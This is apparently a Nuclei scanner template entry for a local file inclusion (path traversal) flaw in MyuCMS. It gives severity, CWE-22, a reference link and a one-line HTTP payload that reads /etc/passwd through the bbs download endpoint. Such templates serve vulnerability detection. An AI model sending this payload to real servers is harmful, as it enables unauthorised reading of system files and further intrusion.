# Nuclei Template: MyuCMS - Local File Inclusion
**Template ID:** myucms-lfr
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`myucms-lfr.yaml`)

## Vulnerability Information & PoC

## Description
MyuCMS is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
```

## References
- https://blog.csdn.net/yalecaltech/article/details/104908257
